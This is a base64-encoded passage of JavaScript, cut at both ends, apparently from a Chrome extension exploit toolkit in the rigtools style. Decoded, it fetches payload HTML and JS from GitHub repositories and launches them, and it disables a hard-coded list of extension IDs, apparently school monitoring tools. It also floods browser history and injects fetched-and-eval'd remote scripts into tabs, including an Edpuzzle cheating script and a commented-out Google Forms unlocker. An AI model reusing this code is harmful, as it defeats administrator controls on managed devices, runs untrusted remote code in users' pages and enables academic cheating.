vbHZlLmJpbmQobnVsbCwgZW50cnkudG9VUkwoKSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgY29uc3QgdXJsID0gYXdhaXQgd3JpdGVGaWxlKAogICAgICAgICAgICAgICAgImhhcnRvb2xzLmh0bWwiLAogICAgICAgICAgICAgICAgYCR7YXdhaXQgZmV0Y2goCiAgICAgICAgICAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Nyb3NzamJseS9IYXJUb29scy9yZWZzL2hlYWRzL21haW4vcGF5bG9hZHMvaW5kZXguaHRtbCIKICAgICAgICApLnRoZW4oKHJlcykgPT4gcmVzLnRleHQoKSl9PHNjcmlwdCBzcmM9Ii4vaGFydG9vbHMuanMiPjwvc2NyaXB0PmAKICAgICAgICAgICAgKTsKCiAgICAgICAgICAgIGF3YWl0IHdyaXRlRmlsZSgKICAgICAgICAgICAgICAgICJoYXJ0b29scy5qcyIsCiAgICAgICAgICAgICAgICBhd2FpdCBmZXRjaCgKICAgICAgICAgICAgICAgICAgICAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Nyb3NzamJseS9IYXJUb29scy9yZWZzL2hlYWRzL21haW4vcGF5bG9hZHMvaW5kZXguanMiCiAgICAgICAgICAgICAgICApLnRoZW4oKHJlcykgPT4gcmVzLnRleHQoKSkKICAgICAgICAgICAgKTsKCiAgICAgICAgICAgIGNocm9tZS50YWJzLmNyZWF0ZSh7CiAgICAgICAgICAgICAgICB1cmwKICAgICAgICAgICAgfSk7CiAgICAgICAgfSkoKTsKICAgIH07CiAgICBTY3JpcHRCdXR0b25zLnF1ZXJ5U2VsZWN0b3IoIiNxdWljay1ybXYtYmx0Iikub25jbGljayA9IGFzeW5jIGZ1bmN0aW9uIGRmKGUpIHsKICAgICAgICAoYXN5bmMgKCkgPT4gewoKICAgICAgICAgICAgY29uc3QgZnMgPSBhd2FpdCBuZXcgUHJvbWlzZShmdW5jdGlvbiAocmVzb2x2ZSkgewogICAgICAgICAgICAgICAgICB3ZWJraXRSZXF1ZXN0RmlsZVN5c3RlbShQRVJTSVNURU5ULCAyICogMTAyNCAqIDEwMjQsIHJlc29sdmUpOwogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgIAogICAgICAgICAgICBmdW5jdGlvbiB3cml0ZUZpbGUoZmlsZSwgZGF0YSkgewogICAgICAgICAgICAgICAgICByZXR1cm4gbmV3IFByb21pc2UoKHJlc29sdmUsIHJlamVjdCkgPT4gewogICAgICAgICAgICAgICAgICAgIGZzLnJvb3QuZ2V0RmlsZShmaWxlLCB7IGNyZWF0ZTogdHJ1ZSB9LCBmdW5jdGlvbiAoZW50cnkpIHsKICAgICAgICAgICAgICAgICAgICAgIGVudHJ5LnJlbW92ZShmdW5jdGlvbiAoKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGZzLnJvb3QuZ2V0RmlsZShmaWxlLCB7IGNyZWF0ZTogdHJ1ZSB9LCBmdW5jdGlvbiAoZW50cnkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICBlbnRyeS5jcmVhdGVXcml0ZXIoZnVuY3Rpb24gKHdyaXRlcikgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgd3JpdGVyLndyaXRlKG5ldyBCbG9iKFtkYXRhXSkpOwogICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdyaXRlci5vbndyaXRlZW5kID0gcmVzb2x2ZS5iaW5kKG51bGwsIGVudHJ5LnRvVVJMKCkpOwogICAgICAgICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgCiAgICAgICAgICAgIGNvbnN0IEpTID0gYHRyeSB7CiAgICAgICAgICAgICAgICAgICAgY29uc3QgYmxvYXRJZHMgPSBbCiAgICAgICAgICAgICAgICAgICAgICAiY2diYmJqbWdkcG5pZmlqY29uaGFtZ2dqZWhsYW1jaWYiLAogICAgICAgICAgICAgICAgICAgICAgImxma2JibWNsbnBhaWhwYWFqaG9oaGZkamVsY2hraWtmIiwKICAgICAgICAgICAgICAgICAgICAgICJuY2JvZm5obW1mZmZtY2RtYmpmYWlnZXBrZ21qbmxuZSIsCiAgICAgICAgICAgICAgICAgICAgICAicG9obWdvYmRlYWplbWNpZnBvbGRubmhmZmpubmtoZ2YiLAogICAgICAgICAgICAgICAgICAgICAgImJlY2RwbGZhbG9vZmxhbmlwam9ibGNtcGFla2tiYmhlIiwKICAgICAgICAgICAgICAgICAgICAgICJmZWVwbWRsbWhwbGFvamFiZW9lY2FvYmZtaWJvb2FpZCIsCiAgICAgICAgICAgICAgICAgICAgICAiYWRrY3BrcGdoYWhtYm9wa2pjaG9iaWVja2VvYW9lZW0iLAogICAgICAgICAgICAgICAgICAgICAgImhhbGRsZ2xkcGxnbmdna2phYWZoZWxnaWFnbGFmYW5oIiwKICAgICAgICAgICAgICAgICAgICAgICJmaWxncGprZG1qaW5tamJlcGJwbW5mb2Jtam1naW1vbiIsCiAgICAgICAgICAgICAgICAgICAgICAia2tibWRnamdnY2RhamNrZGxibmdkam9ucGNocGFpZWEiLAogICAgICAgICAgICAgICAgICAgICAgIm5qZG5pY2xnZWdpamRjZGxpa2xnaWVpY2FucG1jbmdqIiwKICAgICAgICAgICAgICAgICAgICAgICJocGtkb2tha2pnbHBwZWVrZmVla21lYmZhaGFkbmZscCIKICAgICAgICAgICAgICAgICAgICBdOwogICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBibG9hdElkcy5mb3JFYWNoKChpZCkgPT4gewogICAgICAgICAgICAgICAgICAgICAgaWYgKGlkID09IGNocm9tZS5ydW50aW1lLmlkKSByZXR1cm47CiAgICAgICAgICAgICAgICAgICAgICAgIGNocm9tZS5tYW5hZ2VtZW50LnNldEVuYWJsZWQoaWQsIGZhbHNlKTsKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICB3aW5kb3cuY2xvc2UoKTsKICAgICAgICAgICAgICAgICAgfSBjYXRjaCB7CiAgICAgICAgICAgICAgICAgICAgYWxlcnQoInVuc3VjY2Vzc2Z1bCIpOwogICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIGA7CiAgICAgICAgICAgIAogICAgICAgICAgICBjb25zdCBmaWxlTmFtZSA9ICJibG9hdCI7CiAgICAgICAgICAgIAogICAgICAgICAgICBjb25zdCB1cmwgPSBhd2FpdCB3cml0ZUZpbGUoYCR7ZmlsZU5hbWV9Lmh0bWxgLGA8IWRvY3R5cGVodG1sPjx0aXRsZT5kaXNhYmxpbmcuLjwvdGl0bGU+PGxpbmsgaHJlZj0iaHR0cHM6Ly9mb250cy5nb29nbGVhcGlzLmNvbS9jc3MyP2ZhbWlseT1JbnRlcjppdGFsLG9wc3osd2dodEAwLDE0Li4zMiwxMDAuLjkwMDsxLDE0Li4zMiwxMDAuLjkwMCZkaXNwbGF5PXN3YXAicmVsPXN0eWxlc2hlZXQ+PHN0eWxlPnB7bWFyZ2luOjB9Ym9keXtiYWNrZ3JvdW5kLWNvbG9yOiMwMDA7Y29sb3I6I2ZmZjtmb250LWZhbWlseTpJbnRlcixzYW5zLXNlcmlmO21hcmdpbjowO2Rpc3BsYXk6ZmxleDtqdXN0aWZ5LWNvbnRlbnQ6Y2VudGVyO2FsaWduLWl0ZW1zOmNlbnRlcjtoZWlnaHQ6MTAwdmh9aDE6OmJlZm9yZXtjb250ZW50OiIjICI7Y29sb3I6b2tsY2goODEuMjElIC4xNDA5IDE2NS4xNCk7Zm9udC13ZWlnaHQ6OTAwfS5pbm5lcntkaXNwbGF5OmZsZXg7ZmxleC1kaXJlY3Rpb246Y29sdW1uO2p1c3RpZnktY29udGVudDpjZW50ZXI7YWxpZ24taXRlbXM6Y2VudGVyO3RleHQtYWxpZ246Y2VudGVyfXRleHRhcmVhe3dpZHRoOm1heC1jb250ZW50O3BhZGRpbmctdG9wOjFlbTtvdmVyZmxvdy15OmhpZGRlbjtib3JkZXItcmFkaXVzOjEwcHg7YmFja2dyb3VuZDpva2xjaCgxNy4wMyUgLjAwODMgMjg1LjQ5IC8gLjUpO2JvcmRlcjoxcHggc29saWQgb2tsY2goNjguNjUlIC4wMzc0IDI3NC43MyAvIC41KTtjb2xvcjpva2xjaCg5NS45MiUgLjAxOTI1MyAyNzMuMjM3Nyk7cmVzaXplOm5vbmU7Zm9udC1mYW1pbHk6bW9ub3NwYWNlO3RyYW5zaXRpb246YWxsIC41cyBjdWJpYy1iZXppZXIoLjE3NSwuODg1LC4zMiwxLjkpLGNvbG9yIC4yNXMsYm9yZGVyLWNvbG9yIC4yNXN9PC9zdHlsZT48ZGl2IGNsYXNzPWlubmVyPjx0ZXh0YXJlYSBjb2xzPTEyIHJlYWRvbmx5IHJvd3M9Mj4gICheX19fX14pPC90ZXh0YXJlYT48aDE+ZGlzYWJsaW5nLi4uPC9oMT48cD5oYXBweSBkYXlzICB3aXRob3V0IGJsb2NraW5nIGFtIGkgcmlnaHQ/PC9kaXY+PHNjcmlwdCBzcmM9Li8ke2ZpbGVOYW1lfS5qcz48L3NjcmlwdD5gKTsKICAgICAgICAgICAgCiAgICAgICAgICAgIGF3YWl0IHdyaXRlRmlsZShgJHtmaWxlTmFtZX0uanNgLCBKUyk7CiAgICAgICAgICAgIAogICAgICAgICAgICBjaHJvbWUudGFicy5jcmVhdGUoeyB1cmwgfSk7CiAgICAgICAgICAgIAogICAgICAgICAgICB9KSgpOwogICAgfTsKCiAgICBTY3JpcHRCdXR0b25zLnF1ZXJ5U2VsZWN0b3IoIiNoc3RmbGQiKS5vbmNsaWNrID0gYXN5bmMgZnVuY3Rpb24gZGYoZSkgewogICAgICAgIGRvY3VtZW50LnRpdGxlID0gIlVudGl0bGVkIGRvY3VtZW50IjsKICAgICAgICBsZXQgbGluayA9CiAgICAgICAgICAgIGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoImxpbmtbcmVsfj0naWNvbiddIikgfHwKICAgICAgICAgICAgZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgibGluayIpOwogICAgICAgIGxpbmsucmVsID0gImljb24iOwogICAgICAgIGRvY3VtZW50LmhlYWQuYXBwZW5kQ2hpbGQobGluayk7CiAgICAgICAgbGluay5ocmVmID0KICAgICAgICAgICAgImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9jcm9zc2pibHkvSGFyVG9vbHMtcmlndG9vbHMxMjhwbHVzL3JlZnMvaGVhZHMvbWFpbi8iOwoKICAgICAgICBsZXQgbnVtID0gcHJvbXB0KAogICAgICAgICAgICAiSG93IFRpbWVzIERvIFlvdSBXYW50IFRoaXMgUGFnZSBUbyBTaG93IFVwIEluIHlvdXIgSGlzdG9yeT8iCiAgICAgICAgKTsKICAgICAgICBsZXQgZG9uZSA9IGZhbHNlOwogICAgICAgIGNvbnN0IHggPSB3aW5kb3cubG9jYXRpb24uaHJlZjsKICAgICAgICBmb3IgKGxldCBpID0gMTsgaSA8PSBudW07IGkrKykgewogICAgICAgICAgICBoaXN0b3J5LnB1c2hTdGF0ZSgwLCAwLCBpID09PSBudW0gPyB4IDogaS50b1N0cmluZygpKTsKICAgICAgICAgICAgaWYgKGkgPT09IG51bSkgZG9uZSA9IHRydWU7CiAgICAgICAgfQogICAgICAgIGlmIChkb25lKSB7CiAgICAgICAgICAgIGFsZXJ0KAogICAgICAgICAgICAgICAgIkZsb29kaW5nIFN1Y2Nlc3NmdWwhXG4gIiArCiAgICAgICAgICAgICAgICB3aW5kb3cubG9jYXRpb24uaHJlZiArCiAgICAgICAgICAgICAgICAiIFxuSXMgTm93IEluIFlvdXIgSGlzdG9yeSAiICsKICAgICAgICAgICAgICAgIG51bSArCiAgICAgICAgICAgICAgICAobnVtID09IDEgPyAiIHRpbWUuIiA6ICIgVGltZXMuIikKICAgICAgICAgICAgKTsKICAgICAgICB9CiAgICB9OwoKICAgIGNvbnN0IFRhYkJ1dHRvbnMgPSBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCIjdGFicy1idXR0b25zIik7CgogICAgaWYgKGNocm9tZS50YWJzLmV4ZWN1dGVTY3JpcHQpIHsKCiAgICAgICAgZnVuY3Rpb24gbGlzdGVuZXJBcHAoY2FsbGJhY2spIHsKICAgICAgICAgICAgY29uc3QgZnVuYyA9IChpZCwgY2hhbmdlSW5mbykgPT4gewogICAgICAgICAgICAgICAgaWYgKGNoYW5nZUluZm8uc3RhdHVzID09PSAiY29tcGxldGUiKSB7CiAgICAgICAgICAgICAgICAgICAgY2hyb21lLnRhYnMuZ2V0KGlkLCAodGFiKSA9PiB7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmICh0YWIpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNhbGxiYWNrKHRhYik7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfTsKICAgICAgICAgICAgY2hyb21lLnRhYnMub25VcGRhdGVkLmFkZExpc3RlbmVyKGZ1bmMpOwogICAgICAgICAgICByZXR1cm4gZnVuYzsKICAgICAgICB9CgogICAgICAgIGNvbnN0IHNjcmlwdHMgPSB7fTsKICAgICAgICBjb25zdCBjb25kaXRpb25zID0ge307CiAgICAgICAgY29uc3QgbGlzdGVuZXJzID0ge307CgogICAgICAgIHNjcmlwdHMuZXJ1ZGEgPSBgCiAgICBmZXRjaCgiaHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L25wbS9lcnVkYSIpLnRoZW4ocmVzID0+IHJlcy50ZXh0KCkpLnRoZW4oKGRhdGEpID0+IHsKICAgICAgZXZhbChkYXRhKTsKICAgICAgaWYgKCF3aW5kb3cuZXJ1ZGFMb2FkZWQpIHsKICAgICAgICBlcnVkYS5pbml0KHsKICAgICAgICAgIGRlZmF1bHRzOiB7CiAgICAgICAgICAgIGRpc3BsYXlTaXplOiA0NSwKICAgICAgICAgICAgdGhlbWU6ICJBTU9MRUQiCiAgICAgICAgICB9CiAgICAgICAgfSk7CiAgICAgICAgd2luZG93LmVydWRhTG9hZGVkID0gdHJ1ZTsKICAgICAgfQogICAgfSk7CiAgYDsKCiAgICAgICAgc2NyaXB0cy5jaGlpID0gYAogICAgY29uc3Qgc2NyaXB0ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7CiAgICBzY3JpcHQuc3JjID0gJ2h0dHBzOi8vY2hpaS5saXJpbGlyaS5pby9wbGF5Z3JvdW5kL3RhcmdldC5qcyc7CiAgICBzY3JpcHQuc2V0QXR0cmlidXRlKCdlbWJlZGRlZCcsICd0cnVlJyk7CiAgICBkb2N1bWVudC5oZWFkLmFwcGVuZENoaWxkKHNjcmlwdCk7CiAgYDsKCiAgICAgICAgc2NyaXB0cy5hZGJsb2NrID0gYAogICAgKGZ1bmN0aW9uKCl7CgogICAgICB2YXIgc2VsZWN0b3JzID0gWwoKICAgICAgJyNzaWRlYmFyLXdyYXAnLCAnI2FkdmVydCcsICcjeHJhaWwnLCAnI21pZGRsZS1hcnRpY2xlLWFkdmVydC1jb250YWluZXInLAogICAgICAnI3Nwb25zb3JlZC1yZWNvbW1lbmRhdGlvbnMnLCAnI2Fyb3VuZC10aGUtd2ViJywgJyNzcG9uc29yZWQtcmVjb21tZW5kYXRpb25zJywKICAgICAgJyN0YWJvb2xhLWNvbnRlbnQnLCAnI3RhYm9vbGEtYmVsb3ctdGFib29sYS1uYXRpdmUtdGh1bWJuYWlscycsICcjaW5hcnRpY2xlX3dyYXBwZXJfZGl2JywKICAgICAgJyNyYy1yb3ctY29udGFpbmVyJywgJyNhZHMnLCAnI2F0LXNoYXJlLWRvY2snLCAnI2F0NC1zaGFyZScsICcjYXQ0LWZvbGxvdycsICcjcmlnaHQtYWRzLXJhaWwnLAogICAgICAnZGl2I2FkLWludGVyc3RpdGlhbCcsICdkaXYjYWR2ZXJ0LWFydGljbGUnLCAnZGl2I2FjLWxyZS1wbGF5ZXItcGgnLAoKICAgICAgJy5hZCcsICcuYXZlcnQnLCAnLmF2ZXJ0X193cmFwcGVyJywgJy5taWRkbGUtYmFubmVyLWFkJywgJy5hZHZlcnRpc2VtZW50JywKICAgICAgJy5Hb29nbGVBY3RpdmVWaWV3Q2xhc3MnLCAnLmFkdmVydCcsICcuY25zLWFkcy1zdGFnZScsICcudGVhZHMtaW5yZWFkJywgJy5hZC1iYW5uZXInLAogICAgICAnLmFkLWFuY2hvcmVkJywgJy5qc19zaGVsZl9hZHMnLCAnLmFkLXNsb3QnLCAnLmFudGVubmEnLCAnLnhyYWlsLWNvbnRlbnQnLAogICAgICAnLmFkdmVydGlzZW1lbnRfX2xlYWRlcmJvYXJkJywgJy5hZC1sZWFkZXJib2FyZCcsICcudHJjX3Jib3hfb3V0ZXInLCAnLmtzLXJlY29tbWVuZGVkJywKICAgICAgJy5hcnRpY2xlLWRhJywgJ2Rpdi5zcG9uc29yZWQtc3Rvcmllcy1jb21wb25lbnQnLCAnZGl2LmFkZHRoaXMtc21hcnRsYXllcnMnLAogICAgICAnZGl2LmFydGljbGUtYWRzcG9uc29yJywgJ2Rpdi5zaWduaW4tcHJvbXB0JywgJ2Rpdi5hcnRpY2xlLWJ1bXBlcicsICdkaXYudmlkZW8tcGxhY2Vob2xkZXInLAogICAgICAnZGl2LnRvcC1hZC1jb250YWluZXInLCAnZGl2LmhlYWRlci1hZCcsICdkaXYuYWQtdW5pdCcsICdkaXYuZGVtby1ibG9jaycsICdkaXYuT1VUQlJBSU4nLAogICAgICAnZGl2Lm9iLXdpZGdldCcsICdkaXYubndzcm0td3JhcHBlcicsICdkaXYuYW5ub3VuY2VtZW50QmFyJywgJ2Rpdi5wYXJ0bmVyLXJlc291cmNlcy1ibG9jaycsCiAgICAgICdkaXYuYXJyb3ctZG93bicsICdkaXYubS1hZCcsICdkaXYuc3RvcnktaW50ZXJydXB0JywgJ2Rpdi50YWJvb2xhLXJlY29tbWVuZGVkJywKICAgICAgJ2Rpdi5hZC1jbHVzdGVyLWNvbnRhaW5lcicsICdkaXYuY3R4LXNpZGViYXInLCAnZGl2LmluY29nbml0by1tb2RhbCcsICcuT1VUQlJBSU4nLCAnLnN1YnNjcmliZS1idXR0b24nLAogICAgICAnLmFkczknLCAnLmxlYWRlcmJvYXJkcycsICcuR29vZ2xlQWN0aXZlVmlld0VsZW1lbnQnLCAnLm1wdS1jb250YWluZXInLCAnLmFkLTMwMHg2MDAnLCAnLnRmLWFkLWJsb2NrJywKICAgICAgJy5zaWRlYmFyLWFkcy1ob2xkZXItdG9wJywgJy5hZHMtb25lJywgJy5GdWxsUGFnZU1vZGFsX19zY3JvbGxlcicsCiAgICAgICcuY29udGVudC1hZHMtaG9sZGVyJywgJy53aWRnZXQtYXJlYScsICcuc29jaWFsLWJ1dHRvbnMnLCAnLmFjLXBsYXllci1waCcsCgogICAgICAnYXNpZGUjc3BvbnNvcmVkLXJlY29tbWVuZGF0aW9ucycsICdhc2lkZVtyb2xlPSJiYW5uZXIiXScsICdhc2lkZScsCiAgICAgICdhbXAtYWQnLCAnc3BhbltpZF49YWRfaXNfXScsICdkaXZbY2xhc3MqPSJpbmRpYW5hcG9saXMtb3B0aW4iXScsICdkaXZbaWRePWdvb2dsZV9hZHNfaWZyYW1lXScsCiAgICAgICdkaXZbZGF0YS1nb29nbGUtcXVlcnktaWRdJywgJ3NlY3Rpb25bZGF0YS1yZXNwb25zZV0nLCAnaW5zLmFkc2J5Z29vZ2xlJywgJ2RpdltkYXRhLWdvb2dsZS1xdWVyeS1pZF0nLAogICAgICAnZGl2W2RhdGEtdGVzdC1pZD0iZnVsbFBhZ2VTaWdudXBNb2RhbCJdJywgJ2RpdltkYXRhLXRlc3QtaWQ9ImdpZnRXcmFwIl0nIF07CiAgICAgIGZvcihsZXQgaSBpbiBzZWxlY3RvcnMpIHsKICAgICAgICAgIGxldCBub2Rlc0xpc3QgPSBkb2N1bWVudC5xdWVyeVNlbGVjdG9yQWxsKHNlbGVjdG9yc1tpXSk7CiAgICAgICAgICBmb3IobGV0IGkgPSAwOyBpIDwgbm9kZXNMaXN0Lmxlbmd0aDsgaSsrKSB7CiAgICAgICAgICAgICAgbGV0IGVsID0gbm9kZXNMaXN0W2ldOwogICAgICAgICAgICAgIGlmKGVsICYmIGVsLnBhcmVudE5vZGUpCiAgICAgICAgICAgICAgZWwucGFyZW50Tm9kZS5yZW1vdmVDaGlsZChlbCk7CiAgICAgICAgICB9CiAgICAgIH0KICAgIH0pKCk7CiAgYDsKICAvKnNjcmlwdHMuZ2xvY2tlZCA9IGAKZmV0Y2goImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS94TmFzdW5pL2dvb2dsZS1mb3Jtcy11bmxvY2tlci9yZWZzL2hlYWRzL21haW4vc2NyaXB0LmpzIikKICAudGhlbihyZXNwb25zZSA9PiB7CiAgICBpZiAoIXJlc3BvbnNlLm9rKSB7CiAgICAgIHRocm93IG5ldyBFcnJvcigiTmV0d29yayByZXNwb25zZSB3YXMgbm90IG9rIik7CiAgICB9CiAgICByZXR1cm4gcmVzcG9uc2UudGV4dCgpOwogIH0pCiAgLnRoZW4oc2NyaXB0Q29udGVudCA9PiB7CiAgICBpZiAoIXdpbmRvdy5za2liTG9hZGVkKSB7CiAgICAgIGV2YWwoc2NyaXB0Q29udGVudCk7CiAgICAgIHdpbmRvdy5za2liTG9hZGVkID0gdHJ1ZTsKICAgIH0KICB9KQogIC5jYXRjaChlcnJvciA9PiBhbGVydCgiRXJyb3IgbG9hZGluZyBzY3JpcHQ6IiwgZXJyb3IpKTsKYDsKKi8KICAgICAgICBzY3JpcHRzLmVkcHV6emxlID0gYAogICAgZmV0Y2goImh0dHBzOi8vY2RuLmpzZGVsaXZyLm5ldC9naC9NaW5lcjQ5dXIvc2hvcnRoYW5kQG1haW4vZWRwdXp6bGluZ3NjcmlwdC5qcyIpLnRoZW4ociA9PiByLnRleHQoKSkudGhlbihyID0+IHsKICAgICAgaWYgKCF3aW5kb3cuZWRwdXp6bGVzTG9hZGVkKSB7CiAgICAgICAgZXZhbChyKTsKICAgICAgICB3aW5kb3cuZWRwdXp6bGVzTG9hZGVkID0gdHJ1ZTsKICAgICAgfQogICAgfSk7CiAgYDsKICAgICAgICBjb25kaXRpb25zLmVkcHV6emxlID0gKHRhYikgPT4gdGFiLnVybC5tYXRjaCgvZWRwdXp6bGVcLmNvbVwvYXNzaWdubWVudHMvZyk7CiAgICAgICAgLy8gY29uZGl0aW9ucy5nbG9ja2VkID0gKHRhYikgPT4gdGFiLnVybC5tYXRjaCgvaHR0cHM/OlwvXC9kb2NzXC5nb29nbGVcLmNvbVwvZm9ybXNcLy9nKTsKICAgICAgICBjb25zdCBUb2dnbGVCdXR0b25zID0gVGFiQnV0dG9ucy5xdWVyeVNlbGVjdG9yKCIjdG9nZ2xlYWJsZS1idXR0b25zIik7CgogICAgICAgIFRvZ2dsZUJ1dHRvbnMucXVlcnlTZWxlY3RvckFsbCgiYnV0dG9uIikuZm9yRWFjaCgKICAgICAgICAgICAgKGIpID0+CiAgICAgICAgICAgIChiLm9uY2xpY2sgPSAoKSA9PiB7CiAgICAgICAgICAgICAgICBjb25zdCBpZCA9IGIuaWQ7CgogICAgICAgICAgICAgICAgaWYgKGIuaGFzQXR0cmlidXRlKCJ0b2dnbGVkIikpIHsKCiAgICAgICAgICAgICAgICAgICAgaWYgKGlkIGluIGxpc3RlbmVycykKICAgICAgICAgICAgICAgICAgICAgICAgY2hyb21lLnRhYnMub25VcGRhdGVkLnJlbW92ZUxpc3RlbmVyKGxpc3RlbmVyc1tpZF0pOwogICAgICAgICAgICAgICAgICAgIGIucmVtb3ZlQXR0cmlidXRlKCJ0b2dnbGVkIik7CiAgICAgICAgICAgICAgICB9IGVsc2UgewoKICAgICAgICAgICAgICAgICAgICBjb25zdCBzY3JpcHQgPSBzY3JpcHRzW2lkXSB8fCAiIjsKICAgICAgICAgICAgICAgICAgICBjb25zdCBjb25kaXRpb24gPSBjb25kaXRpb25zW2lkXSB8fCAoKHRhYikgPT4gdHJ1ZSk7CiAgICAgICAgICAgICAgICAgICAgY29uc3QgZnVuYyA9IGxpc3RlbmVyQXBwKCh0YWIpID0+IHsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGNvbmRpdGlvbih0YWIpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaHJvbWUudGFicy5leGVjdXRlU2NyaXB0KHRhYi5pZCwgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvZGU6IHNjcmlwdAogICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9KTsKCiAgICAgICAgICAgICAgICAgICAgbGlzdGVuZXJzW2lkXSA9IGZ1bmM7CgogICAgICAgICAgICAgICAgICAgIGIuc2V0QXR0cmlidXRlKCJ0b2dnbGVkIiwgInRydWUiKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfSkKICAgICAgICApOwogICAgfSBlbHNlIHsKICAgICAgICBUYWJCdXR0b25zLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7CiAgICB9CgogICAgZG9jdW1lbnQKICAgICAgICAucXVlcnlTZWxlY3RvcigiI2NvZGUtcnVuIikKICAgICAgICAuYWRkRXZlbnRMaXN0ZW5lcigiY2xpY2siLCAoKSA9PiBydW5Db2RlKGZhbHNlKSk7Cn07Cgpjb25zdCBydW5Db2RlID0gYXN5bmMgKG9uVGFiLCB0YWJJZCA9ICIiKSA9PiB7CiAgICBjb25zdCBjb2RlVGV4dGFyZWEgPSBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCIjY29kZSIpOwogICAgbGV0IGNvZGUgPSBjb2RlVGV4dGFyZWEudmFsdWUudHJpbSgpOwoKICAgIGNvbnN0IG91dHB1dERpdiA9IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoIiNjb2RlLW91dHB1dCIpOwoKICAgIGlmIChjb2RlLnRvTG93ZXJDYXNlKCkgPT09ICJwcmFoaXQiKSB7CgogICAgICAgIGNvbnN0IGNvbnRhaW5lciA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImRpdiIpOwogICAgICAgIGNvbnRhaW5lci5jbGFzc05hbWUgPSAicHJhaGl0LWNvbnRhaW5lciI7CgogICAgICAgIGNvbnN0IG92ZXJsYXlJbWFnZSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImltZyIpOwogICAgICAgIG92ZXJsYXlJbWFnZS5zcmMgPQogICAgICAgICAgICAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3QzbTFuNGwvcmlndG9vbHMtdXBkYXRlZC11aS9yZWZzL2hlYWRzL21haW4vaW1nL3ByYWhpdC5wbmciOwogICAgICAgIG92ZXJsYXlJbWFnZS5hbHQgPSAiUHJhaGl0IEltYWdlIjsKICAgICAgICBvdmVybGF5SW1hZ2UuY2xhc3NOYW1lID0gInByYWhpdC1pbWFnZSI7CgogICAgICAgIGNvbnN0IHRleHRCb3ggPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJkaXYiKTsKICAgICAgICB0ZXh0Qm94LnRleHRDb250ZW50ID0gIlwiSSBtYWRlIG15IG93biBvaWwgcmlnZ2luZyBzdG9jayBtYXJrZXQgdG9vbHMuXCIiOwogICAgICAgIHRleHRCb3guY2xhc3NOYW1lID0gInByYWhpdC10ZXh0Ym94IjsKCiAgICAgICAgY29udGFpbmVyLmFwcGVuZENoaWxkKG92ZXJsYXlJbWFnZSk7CiAgICAgICAgY29udGFpbmVyLmFwcGVuZENoaWxkKHRleHRCb3gpOwoKICAgICAgICBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGNvbnRhaW5lcik7CgogICAgICAgIGNvbnN0IHNub3dmbGFrZXNEaXYgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJkaXYiKTsKICAgICAgICBzbm93Zmxha2VzRGl2LmNsYXNzTmFtZSA9ICJzbm93Zmxha2VzIjsKICAgICAgICBzbm93Zmxha2VzRGl2LnNldEF0dHJpYnV0ZSgiYXJpYS1oaWRkZW4iLCAidHJ1ZSIpOwoKICAgICAgICBmb3IgKGxldCBpID0gMDsgaSA8IDE0OyBpKyspIHsKICAgICAgICAgICAgY29uc3Qgc25vd2ZsYWtlID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiZGl2Iik7CiAgICAgICAgICAgIHNub3dmbGFrZS5jbGFzc05hbWUgPSAic25vd2ZsYWtlIjsKCiAgICAgICAgICAgIGNvbnN0IHNub3dmbGFrZUltYWdlID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiaW1nIik7CiAgICAgICAgICAgIHNub3dmbGFrZUltYWdlLndpZHRoID0gMzA7CiAgICAgICAgICAgIHNub3dmbGFrZUltYWdlLnNyYyA9ICJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vdDNtMW40bC9yaWd0b29scy11cGRhd